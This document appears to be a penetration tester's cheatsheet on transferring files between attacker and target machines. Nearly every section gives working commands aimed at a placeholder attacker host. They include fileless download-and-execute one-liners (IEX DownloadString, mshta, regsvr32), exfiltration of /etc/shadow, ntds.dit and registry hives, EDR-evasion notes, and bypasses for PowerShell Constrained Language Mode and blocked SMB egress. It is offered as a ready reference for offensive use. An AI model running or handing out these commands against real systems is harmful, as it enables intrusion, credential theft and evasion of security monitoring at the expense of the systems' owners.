# File Transfer Cheatsheet

Quick reference for transferring files between attacker and target machines during a penetration test.

For initial service discovery, see [enumeration-methodology.md](enumeration-methodology.md). For pivoting, see [tunneling-pivoting.md](tunneling-pivoting.md).

**Method Selector (pick by constraint):**
| Constraint | Methods |
|---|---|
| HTTP outbound blocked | SMB (`impacket-smbserver`), DNS exfil, ICMP, base64 over existing shell |
| PowerShell CLM active | `certutil`, `bitsadmin`, `cmd /c echo` base64, see CLM section below |
| Text-only channel (blind RCE) | base64 encode → echo → decode (`certutil -decode`/`base64 -d`) |
| No outbound at all | establish tunnel first (tunneling-pivoting.md), or forward-shell (shells-and-payloads.md) |
| Large file / integrity-critical | SMB or HTTP + verify with hash (see Verify section) |
---

## Linux Target (Downloading to Target)

### wget / curl
```bash
# wget
wget http://<ATTACKER_IP>:<PORT>/<FILE> -O /tmp/<FILE>

# curl
curl http://<ATTACKER_IP>:<PORT>/<FILE> -o /tmp/<FILE>

# curl (silent)
curl -s http://<ATTACKER_IP>:<PORT>/<FILE> -o /tmp/<FILE>
```

### Python HTTP Server (Attacker Side)
```bash
# Start HTTP server on attacker
python3 -m http.server 8000

# With specific directory
python3 -m http.server 8000 -d /path/to/files

# PHP built-in server
php -S 0.0.0.0:8000
```

### Netcat
```bash
# Attacker (sender)
nc -lvnp 4444 < file.txt

# Target (receiver)
nc <ATTACKER_IP> 4444 > file.txt

# With timeout (auto-close after transfer completes)
nc -w 3 <ATTACKER_IP> 4444 > file.txt

# Alternative direction (target sends, attacker receives)
# Attacker: nc -lvnp 4444 > file.txt
# Target: nc -w 3 <ATTACKER_IP> 4444 < file.txt
```

### Base64 Encoding (No File Transfer Needed)
```bash
# On attacker — encode
base64 -w0 file.bin

# On target — decode
echo '<BASE64_STRING>' | base64 -d > file.bin

# In one command (small files)
cat file.bin | base64 -w0 | xclip -selection clipboard
```

### SCP
```bash
# Copy from attacker to target
scp file.txt <USER>@<TARGET_IP>:/tmp/

# Copy from target to attacker
scp <USER>@<TARGET_IP>:/etc/passwd ./
```

### SMB (Impacket)
```bash
# Start SMB share on attacker
impacket-smbserver share /path/to/files -smb2support

# On Linux target
smbclient //<ATTACKER_IP>/share -N -c 'get file.txt'

# With authentication (if needed for write)
impacket-smbserver share /path/to/files -smb2support -user test -password test
```

### Bash /dev/tcp (No external tools)
```bash
# Attacker: nc -lvnp 4444 < file.txt
# Target:
cat < /dev/tcp/<ATTACKER_IP>/4444 > /tmp/file.txt
```

[Back to top](#file-transfer-cheatsheet)

---

## Windows Target (Downloading to Target)

### curl.exe (Built-in since Windows 10 1803 / Server 2019)
```powershell
# Download file (native, no PowerShell needed)
curl.exe http://<ATTACKER_IP>:<PORT>/<FILE> -o C:\temp\<FILE>

# Silent download
curl.exe -s http://<ATTACKER_IP>:<PORT>/<FILE> -o C:\temp\<FILE>

# Download and execute in memory (pipe to PowerShell)
curl.exe -s http://<ATTACKER_IP>:<PORT>/script.ps1 | powershell -ep bypass -nop -
```

### certutil
```powershell
certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/<FILE> C:\temp\<FILE>

# Base64 decode
certutil -decode encoded.txt decoded.exe
```

> **⚠️ OPSEC — certutil download is heavily signatured.** Microsoft Defender flags `certutil.exe -urlcache` / `-split -f` as `HackTool:Win32/Certutil!download` since 2020 and the behavior `Behavior:Win32/CertUtilDownload.A` since 2023. Most modern EDRs (CrowdStrike, S1, MDE) alert on the `-urlcache -f http://` argv pattern even when the binary is unmodified. Prefer `curl.exe` (Win10 1803+), `bitsadmin /transfer`, `Start-BitsTransfer`, `Invoke-WebRequest`, or the alternatives below.

### desktopimgdownldr.exe (Windows 10 1803+ / Server 2019)
```cmd
:: LOLBIN — originally for lock-screen wallpaper, abused for arbitrary HTTP(S) download
:: SYSTEMROOT=<path> overrides default %SystemRoot% — file lands in <path>\Temp\<FILENAME>
:: Without the override the file lands under the Personalization CSP cache (Themes\<random>.jpg)
set "SYSTEMROOT=C:\Windows\Temp"
cmd /c desktopimgdownldr.exe /lockscreenurl:http://<ATTACKER_IP>/<FILE> /eventName:desktopimgdownldr

:: Less audited than certutil; HTTPS supported. Note: writing PersonalizationCSP requires admin;
:: the LOLBAS technique above only needs user context.
```

### tar.exe (Built-in since Windows 10 1803 / Server 2019)
```powershell
# tar.exe ships in System32 — use it to extract archives without 7zip / Expand-Archive
tar.exe -xf C:\temp\loot.zip -C C:\temp\extracted\
tar.exe -czf C:\temp\exfil.tgz C:\Users\<USER>\Documents

# Combined with curl.exe — download + extract in two LOTL calls
curl.exe -sk http://<ATTACKER_IP>/tools.zip -o C:\Windows\Temp\t.zip
tar.exe -xf C:\Windows\Temp\t.zip -C C:\Windows\Temp\
```

### mshta.exe (Execute-from-URL LOLBIN)
```cmd
:: Direct execution — no download to disk, runs the .hta in mshta context
mshta.exe http://<ATTACKER_IP>/payload.hta
mshta.exe vbscript:CreateObject("WScript.Shell").Run("powershell -nop -w hidden -c iex(iwr http://<ATTACKER_IP>/s.ps1 -UseBasicParsing)")(window.close)

:: Heavily signatured — Defender flags the inline-vbscript pattern. Prefer for execution
:: only when egress / EDR posture has been confirmed permissive.
```

### PowerShell
```powershell
# DownloadFile
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:<PORT>/<FILE>', 'C:\temp\<FILE>')

# Invoke-WebRequest (aliases in Windows PowerShell 5.1: iwr, wget, curl;
# in PowerShell 7+ the wget/curl aliases were removed — use `iwr` or full cmdlet name)
Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:<PORT>/<FILE>' -OutFile 'C:\temp\<FILE>'

# Download and execute in memory (fileless)
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:<PORT>/script.ps1')

# Bypass execution policy
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')"

# Upload file from target to attacker (requires an upload-capable server, e.g. python3 -m uploadserver 8000)
Invoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/upload -Method POST -InFile C:\temp\file.txt
```

### Bitsadmin
```powershell
bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>:<PORT>/<FILE> C:\temp\<FILE>

# PowerShell equivalent (Start-BitsTransfer)
Start-BitsTransfer -Source "http://<ATTACKER_IP>:<PORT>/<FILE>" -Destination "C:\temp\<FILE>"
```

### SMB Copy
```powershell
# Attacker: impacket-smbserver share /path/to/files -smb2support
copy \\<ATTACKER_IP>\share\<FILE> C:\temp\<FILE>

# With credentials (avoids "access denied" on newer Windows)
# Attacker: impacket-smbserver share /path/to/files -smb2support -user test -password test
net use \\<ATTACKER_IP>\share /user:test test
copy \\<ATTACKER_IP>\share\<FILE> C:\temp\<FILE>
net use \\<ATTACKER_IP>\share /delete
```

### FTP
```powershell
# Attacker: python3 -m pyftpdlib -p 21 -w
ftp <ATTACKER_IP>
# binary → get <FILE> → bye

# Non-interactive FTP
echo open <ATTACKER_IP> 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET <FILE> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

### TFTP (Built-in on older Windows / can be enabled)
```powershell
# Attacker: start TFTP server
# Install: apt install atftpd  OR  python3 -m py3tftp -p 69
sudo atftpd --daemon --port 69 /path/to/files

# On target (Windows)
tftp -i <ATTACKER_IP> GET <FILE> C:\temp\<FILE>
tftp -i <ATTACKER_IP> PUT C:\temp\loot.txt

# Note: TFTP client may need to be enabled on modern Windows:
# dism /online /Enable-Feature /FeatureName:TFTP
# Or use it on older systems (Server 2003/XP) where it's available by default
```

### Base64 (PowerShell)
```powershell
# On attacker (Linux) — encode
cat file.exe | base64 -w0

# On target (Windows) — decode
[IO.File]::WriteAllBytes("C:\temp\file.exe", [Convert]::FromBase64String("<BASE64_STRING>"))

# Or via certutil
echo <BASE64_STRING> > encoded.txt
certutil -decode encoded.txt file.exe
```

### evil-winrm (Built-in Upload/Download)
```bash
# If you have a WinRM shell via evil-winrm, file transfers are built in:

# Upload file to target
upload /path/to/local/file.exe C:\temp\file.exe

# Download file from target
download C:\temp\loot.txt /path/to/local/loot.txt

# Load PowerShell scripts into memory (no disk write)
evil-winrm -i <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -s /path/to/ps1/scripts/
# Then inside the shell: menu → load scripts
```

### Meterpreter (Built-in Upload/Download)
```bash
# If you have a Meterpreter session, file transfers are built in:

# Upload file to target (attacker → target)
meterpreter> upload /opt/tools/winpeas.exe C:\\Windows\\Temp\\winpeas.exe
meterpreter> upload /opt/tools/mimikatz.exe C:\\temp\\mimi.exe
meterpreter> upload /home/user/script.ps1 C:\\temp\\script.ps1

# Upload directory recursively
meterpreter> upload -r /opt/tools/ C:\\temp\\tools\\

# Download file from target (target → attacker)
meterpreter> download C:\\Windows\\NTDS\\ntds.dit /tmp/ntds.dit
meterpreter> download C:\\Windows\\System32\\config\\SYSTEM /tmp/SYSTEM
meterpreter> download "C:\\Users\\Administrator\\Documents\\passwords.txt" /tmp/passwords.txt

# Note: Windows paths in Meterpreter need escaped backslashes (\\) or forward slashes (/)
# Both work: C:\\temp\\file.exe  or  C:/temp/file.exe

# Check available disk space and target directory before large transfers
meterpreter> df
meterpreter> ls C:\\Windows\\Temp

# Linux target — same syntax, use POSIX paths
meterpreter> upload /opt/linpeas.sh /tmp/linpeas.sh
meterpreter> execute -f /bin/chmod -a "755 /tmp/linpeas.sh"    # make executable
meterpreter> download /etc/shadow /tmp/shadow
```

### PowerShell Remoting — Copy-Item (Pure LOTL)

When you have valid creds and WinRM (5985/5986) reachability, `Copy-Item -ToSession / -FromSession` moves files over the existing PSRemoting channel. No external tool, no SMB share, traffic blends with normal admin remoting.

```powershell
# Build a credential and session once
$cred = Get-Credential                 # or: New-Object PSCredential('<USER>',(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force))
$s    = New-PSSession -ComputerName <TARGET_IP> -Credential $cred
# HTTPS variant when 5986 is open and a valid cert is presented
$s    = New-PSSession -ComputerName <TARGET_IP> -Credential $cred -UseSSL

# Push a file to the remote host
Copy-Item -Path C:\Tools\loader.exe -Destination C:\Windows\Temp\loader.exe -ToSession $s

# Push an entire directory recursively
Copy-Item -Path C:\Tools\ -Destination C:\Windows\Temp\Tools\ -ToSession $s -Recurse

# Pull a file off the remote host
Copy-Item -Path C:\Windows\Temp\out.zip -Destination .\out.zip -FromSession $s

# Verify and clean up
Invoke-Command -Session $s -ScriptBlock { Get-Item C:\Windows\Temp\loader.exe | Select-Object Length, LastWriteTime }
Invoke-Command -Session $s -ScriptBlock { Remove-Item C:\Windows\Temp\loader.exe -Force }
Remove-PSSession $s
```

> Works through pivots if 5985/5986 is reachable through a port-forward / SOCKS-aware Invoke-Command (use `New-PSSession -ComputerName 127.0.0.1 -Port 5985` after a portfwd).

### updog — Authenticated HTTP File Server (Linux Attacker)

When SMB/anonymous-HTTP is too risky (shared lab, hostile network) `updog` exposes a Flask-based HTTP/HTTPS file server with directory listing **and** Basic-Auth, plus an upload form for exfil.

```bash
# https://github.com/sc0tfree/updog
# HTTP with password auth + upload page enabled
updog -d /opt/loot -p 8080 --password '<PASSWORD>'

# HTTPS (auto-generates a self-signed cert)
updog -d /opt/loot -p 8443 --ssl --password '<PASSWORD>'

# IPv6 + bind explicitly
updog -d /opt/loot -p 8080 --ip ::

# Target downloads with credentials
curl -u updog:<PASSWORD> http://<ATTACKER_IP>:8080/payload.exe -o C:\Windows\Temp\p.exe
# PowerShell variant
$pair = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('updog:<PASSWORD>'))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8080/payload.exe -OutFile C:\Windows\Temp\p.exe -Headers @{Authorization="Basic $pair"}

# Target uploads loot back to attacker (multipart form)
curl -u updog:<PASSWORD> -F 'file=@C:\Windows\Temp\loot.zip' http://<ATTACKER_IP>:8080/upload
```

### WebDAV via wsgidav (Bypass Blocked SMB Egress)

Many corporate egress filters block SMB (445) but leave HTTP (80) / HTTPS (443) open. WebDAV gives you a real filesystem-like share over HTTP that Windows mounts natively via the WebClient service.

```bash
# Server side (Kali)
# pip install wsgidav cheroot   (already available on Kali)
wsgidav --host=0.0.0.0 --port=80 --root=/tmp/loot --auth=anonymous

# With basic auth
wsgidav --host=0.0.0.0 --port=80 --root=/tmp/loot --auth=basic --user-mapping='{"/":{"updog":{"password":"<PASSWORD>"}}}'
```

**From a Windows target (cmd.exe — LOTL):**
```cmd
:: Ensure WebClient service is running (auto-starts via this trick)
sc config WebClient start= demand & sc start WebClient
:: Or trigger via UNC path lookup which auto-starts WebClient

:: Mount the WebDAV share — the @80 syntax forces HTTP on port 80
pushd \\<ATTACKER_IP>@80\share
dir
copy payload.exe C:\Windows\Temp\
popd

:: HTTPS variant on 443 with @SSL@443
pushd \\<ATTACKER_IP>@SSL@443\share
```

**From PowerShell:**
```powershell
# Map a drive letter to the WebDAV share
New-PSDrive -Name W -PSProvider FileSystem -Root "\\<ATTACKER_IP>@80\share" -Persist

# Or one-shot copy
Copy-Item "\\<ATTACKER_IP>@80\share\payload.exe" "C:\Windows\Temp\payload.exe"

# Tear down
Remove-PSDrive -Name W
```

> WebClient service runs as `LocalService` and accepts NTLM auth — this is also a coercion primitive (force the host to authenticate to attacker over WebDAV) when paired with relay tooling. Cross-link to [active-directory-methodology.md](active-directory-methodology.md) Phase 11 (Coercion).

[Back to top](#file-transfer-cheatsheet)

---

## Exfiltrating Data from Target

### To Attacker via HTTP
```bash
# Attacker: start upload listener
# Install first: pip3 install uploadserver
python3 -m uploadserver 8000

# From Linux target
curl -X POST http://<ATTACKER_IP>:8000/upload -F 'files=@/etc/shadow'

# From Windows target (PowerShell)
curl.exe -F "files=@C:\temp\data.txt" http://<ATTACKER_IP>:8000/upload
```

### To Attacker via Netcat
```bash
# Attacker
nc -lvnp 4444 > loot.txt

# From target
nc <ATTACKER_IP> 4444 < /etc/shadow
cat /etc/shadow | nc <ATTACKER_IP> 4444
```

### To Attacker via SMB
```powershell
# Attacker: impacket-smbserver share /tmp/loot -smb2support
copy C:\temp\data.txt \\<ATTACKER_IP>\share\data.txt
```

[Back to top](#file-transfer-cheatsheet)

---

## Restricted PowerShell / CLM Environments

When PowerShell is in **Constrained Language Mode** (`$ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage'`) or AppLocker blocks PS script execution, `.NET` constructors like `New-Object Net.WebClient` are blocked. Fall back to native LOLBINs that don't depend on full-language PS.

### Check current language mode first
```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage  → all techniques work
# ConstrainedLanguage → Net.WebClient / [IO.File] / COM blocked; native binaries still work
# RestrictedLanguage / NoLanguage → only built-in cmdlets, no expressions
```

### bitsadmin (CLM-safe — native binary)
```cmd
:: Works under CLM — bitsadmin.exe is a native binary, not a PS construct
bitsadmin /transfer job /priority foreground http://<ATTACKER_IP>/<FILE> C:\Windows\Temp\<FILE>
bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/<FILE> C:\Windows\Temp\<FILE>
```

### Start-BitsTransfer (CLM-safe — built-in cmdlet, no .NET object construction)
```powershell
Start-BitsTransfer -Source "http://<ATTACKER_IP>/<FILE>" -Destination "C:\Windows\Temp\<FILE>"
Start-BitsTransfer -Source "https://<ATTACKER_IP>/<FILE>" -Destination "C:\Windows\Temp\<FILE>" -TransferType Download
```

### certutil (CLM-safe — native binary; heavily AV-flagged, see OPSEC note above)
```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/<FILE> C:\Windows\Temp\<FILE>
certutil -decode in.b64 out.exe
certutil -encode in.exe out.b64
```

### Invoke-WebRequest (CLM-safe — built-in cmdlet, no `New-Object`)
```powershell
# iwr is a built-in cmdlet, not a .NET object construction — works under CLM
Invoke-WebRequest -Uri http://<ATTACKER_IP>/<FILE> -OutFile C:\Windows\Temp\<FILE> -UseBasicParsing
```

### Net.WebClient (BLOCKED under CLM — listed for completeness)
```powershell
# Fails under ConstrainedLanguage — `New-Object Net.WebClient` is a disallowed type
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/<FILE>','C:\Windows\Temp\<FILE>')
# Error: "Cannot create type. Only core types are allowed in this language mode."
```

### MSXML2.XMLHTTP via COM (BLOCKED under CLM — listed for completeness)
```powershell
# Fails under CLM — COM object instantiation is blocked
$x = New-Object -ComObject MSXML2.XMLHTTP
$x.Open('GET','http://<ATTACKER_IP>/<FILE>',$false); $x.Send()
[IO.File]::WriteAllBytes('C:\Windows\Temp\<FILE>',$x.ResponseBody)
# From cmd.exe / WScript context (NOT PS) the COM path still works
```

### ftp.exe with scripted input (CLM-safe — native binary)
```cmd
:: Build script file
echo open <ATTACKER_IP> 21 > %TEMP%\f.txt
echo USER anonymous >> %TEMP%\f.txt
echo anonymous >> %TEMP%\f.txt
echo binary >> %TEMP%\f.txt
echo GET <FILE> C:\Windows\Temp\<FILE> >> %TEMP%\f.txt
echo bye >> %TEMP%\f.txt
ftp -v -n -s:%TEMP%\f.txt
```

### cscript / WScript.Network (CLM-safe — runs under WSH, not PS)
```vbscript
' save as get.vbs, then: cscript //nologo get.vbs
Set xHttp = CreateObject("MSXML2.XMLHTTP")
Set bStrm = CreateObject("ADODB.Stream")
xHttp.Open "GET", "http://<ATTACKER_IP>/<FILE>", False
xHttp.Send
With bStrm
    .Type = 1 ' binary
    .Open
    .Write xHttp.ResponseBody
    .SaveToFile "C:\Windows\Temp\<FILE>", 2
End With
```
```cmd
:: Run from cmd.exe — bypasses PS CLM entirely
cscript //nologo C:\Windows\Temp\get.vbs
```

### Quick CLM-bypass reference

| Method | CLM-safe? | Why |
|---|---|---|
| `bitsadmin /transfer` | yes | Native binary |
| `Start-BitsTransfer` | yes | Built-in cmdlet, no `New-Object` |
| `certutil -urlcache -f` | yes | Native binary (heavy AV signature) |
| `Invoke-WebRequest -OutFile` | yes | Built-in cmdlet |
| `curl.exe` (Win10 1803+) | yes | Native binary |
| `ftp.exe -s:script.txt` | yes | Native binary |
| `cscript //nologo file.vbs` | yes | WSH runtime, not PS |
| `New-Object Net.WebClient` | **no** | `.NET` type instantiation blocked |
| `New-Object -ComObject MSXML2.XMLHTTP` (in PS) | **no** | COM construction blocked in PS CLM |
| `[IO.File]::WriteAllBytes(...)` | **no** | Static method on disallowed type |

[Back to top](#file-transfer-cheatsheet)

---

## Verify After Transfer (Hash Verification)

After staged / multi-hop / base64-decoded transfers, verify integrity before executing. A truncated payload or base64 reassembly bug will detonate weirdly otherwise.

### Linux target
```bash
sha256sum file
md5sum file
sha1sum file

# Compare against expected hash inline
echo '<EXPECTED_SHA256>  file' | sha256sum -c -
```

### Windows target — Get-FileHash (PowerShell)
```powershell
Get-FileHash -Algorithm SHA256 C:\Windows\Temp\file
Get-FileHash -Algorithm MD5    C:\Windows\Temp\file
Get-FileHash -Algorithm SHA1   C:\Windows\Temp\file

# Just the hash string
(Get-FileHash -Algorithm SHA256 C:\Windows\Temp\file).Hash
```

### Windows target — certutil (cmd.exe / CLM-safe)
```cmd
certutil -hashfile C:\Windows\Temp\file SHA256
certutil -hashfile C:\Windows\Temp\file MD5
certutil -hashfile C:\Windows\Temp\file SHA1
```

### Cross-platform — openssl
```bash
# Linux / macOS / any host with openssl
openssl dgst -sha256 file
openssl dgst -md5 file
openssl sha256 file
```
```powershell
# Windows (if openssl is present, e.g. via Git for Windows / OpenSSL install)
openssl dgst -sha256 C:\Windows\Temp\file
```

### Quick-compare oneliners
```bash
# Linux: hash both ends, diff inline
diff <(sha256sum local | awk '{print $1}') <(ssh user@target sha256sum /tmp/file | awk '{print $1}')
```
```powershell
# PowerShell: compare local hash to remote (via PSSession)
$lh = (Get-FileHash -Algorithm SHA256 .\file).Hash
$rh = Invoke-Command -Session $s -ScriptBlock { (Get-FileHash -Algorithm SHA256 C:\Windows\Temp\file).Hash }
if ($lh -eq $rh) { 'MATCH' } else { 'MISMATCH' }
```
```cmd
:: cmd.exe one-liner — extract just the hash line from certutil output
for /f "skip=1 tokens=*" %i in ('certutil -hashfile C:\Windows\Temp\file SHA256') do @echo %i & goto :done
:done
```

### Hash algorithm selector

| Algorithm | When to use |
|---|---|
| SHA256 | Default — use this |
| SHA1 | Legacy compat (Git, older tooling); broken for adversarial collisions but fine for transfer-integrity |
| MD5 | Quick check only — broken cryptographically but still fast for catching truncation |

[Back to top](#file-transfer-cheatsheet)

---

## Living Off the Land (No External Tools)

| OS | Method | Command |
|---|---|---|
| Linux | wget | `wget http://<ATTACKER_IP>/<FILE>` |
| Linux | curl | `curl -o <FILE> http://<ATTACKER_IP>/<FILE>` |
| Linux | bash | `cat < /dev/tcp/<ATTACKER_IP>/<PORT> > <FILE>` |
| Linux | python | `python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ATTACKER_IP>/<FILE>','<FILE>')"` |
| Linux | perl | `perl -e 'use LWP::Simple; getstore("http://<ATTACKER_IP>/<FILE>","<FILE>")'` |
| Linux | php | `php -r 'file_put_contents("<FILE>", file_get_contents("http://<ATTACKER_IP>/<FILE>"));'` |
| Windows | certutil | `certutil -urlcache -f http://<ATTACKER_IP>/<FILE> <FILE>` |
| Windows | PowerShell | `iwr http://<ATTACKER_IP>/<FILE> -o <FILE>` |
| Windows | bitsadmin | `bitsadmin /transfer j /download http://<ATTACKER_IP>/<FILE> C:\temp\<FILE>` |
| Windows | mshta | `mshta http://<ATTACKER_IP>/<FILE>.hta` (execution) |
| Windows | regsvr32 | `regsvr32 /s /n /u /i:http://<ATTACKER_IP>/<FILE>.sct scrobj.dll` |

[Back to top](#file-transfer-cheatsheet)
